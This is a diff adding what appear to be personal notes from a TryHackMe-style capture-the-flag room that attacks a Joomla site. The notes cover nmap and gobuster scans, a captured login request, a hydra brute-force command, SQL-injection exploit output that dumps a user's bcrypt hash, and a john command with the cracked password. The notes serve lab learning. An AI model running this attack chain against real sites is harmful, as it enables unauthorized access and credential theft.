@@ -1,0 +1,76 @@
+TARGET_IP=10.10.150.90
+
+nmap result
+	22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+	80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+	3306/tcp open  mysql   MariaDB (unauthorized)
+
+gobuster result
+	/images      (Status: 301) [Size: 235] [--> http://10.10.150.90/images/]
+	/media                (Status: 301) [Size: 234] [--> http://10.10.150.90/media/] 
+	/templates            (Status: 301) [Size: 238] [--> http://10.10.150.90/templates/]
+	/modules              (Status: 301) [Size: 236] [--> http://10.10.150.90/modules/]  
+	/bin                  (Status: 301) [Size: 232] [--> http://10.10.150.90/bin/]      
+	/plugins              (Status: 301) [Size: 236] [--> http://10.10.150.90/plugins/]  
+	/includes             (Status: 301) [Size: 237] [--> http://10.10.150.90/includes/] 
+	/language             (Status: 301) [Size: 237] [--> http://10.10.150.90/language/] 
+	/components           (Status: 301) [Size: 239] [--> http://10.10.150.90/components/]
+	/cache                (Status: 301) [Size: 234] [--> http://10.10.150.90/cache/]     
+	/libraries            (Status: 301) [Size: 238] [--> http://10.10.150.90/libraries/] 
+	/tmp                  (Status: 301) [Size: 232] [--> http://10.10.150.90/tmp/]       
+	/layouts              (Status: 301) [Size: 236] [--> http://10.10.150.90/layouts/]   
+	/administrator        (Status: 301) [Size: 242] [--> http://10.10.150.90/administrator/]
+	/cli
+	/administrator/help                 (Status: 302) [Size: 247] [--> http://10.10.150.90/administrator/help/]
+	/administrator/templates            (Status: 302) [Size: 252] [--> http://10.10.150.90/administrator/templates/]
+	/administrator/modules              (Status: 302) [Size: 250] [--> http://10.10.150.90/administrator/modules/]  
+	/administrator/includes             (Status: 302) [Size: 251] [--> http://10.10.150.90/administrator/includes/] 
+	/administrator/language             (Status: 302) [Size: 251] [--> http://10.10.150.90/administrator/language/] 
+	/administrator/components           (Status: 302) [Size: 253] [--> http://10.10.150.90/administrator/components/]
+	/administrator/cache                (Status: 302) [Size: 248] [--> http://10.10.150.90/administrator/cache/]     
+	/administrator/logs                 (Status: 302) [Size: 247] [--> http://10.10.150.90/administrator/logs/] 
+
+Login HTTP request intercepted by Burp Suite 
+	POST /administrator/index.php HTTP/1.1
+	Host: 10.10.186.77
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate
+	Content-Type: application/x-www-form-urlencoded
+	Content-Length: 110
+	Origin: http://10.10.186.77
+	Connection: close
+	Referer: http://10.10.186.77/administrator/
+	Cookie: eaa83fe8b963ab08ce9ab7d4a798de05=o9d1a6pbruj5mssv69d474i6h7; 2b01af51830ca9615359108de04d9ca1=h6ef9j8h11rg1umf0600p8cc47
+	Upgrade-Insecure-Requests: 1
+
+	username=admin&passwd=hello&option=com_login&task=login&return=aW5kZXgucGhw&dddfe262b7cb6ee510e5c15f8754b352=1
+hydra command
+	hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.186.77 http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login&return=aW5kZXgucGhw&dddfe262b7cb6ee510e5c15f8754b352=1:Warning"
+
+joomla exploit result
+		    .---.    .-'''-.        .-'''-.                                                           
+	    |   |   '   _    \     '   _    \                            .---.                        
+	    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
+	    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
+	    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
+	    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
+	    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
+	    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
+	    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
+	    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
+	 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
+	|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
+	|____.'                                                                `--'  `" '---'   '---' 
+
+	 [-] Fetching CSRF token
+	 [-] Testing SQLi
+	  -  Found table: fb9j5_users
+	  -  Extracting users from fb9j5_users
+	 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
+	  -  Extracting sessions from fb9j5_session
+
+cracked (john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash.txt)
+	user : jonah
+	password : spiderman123
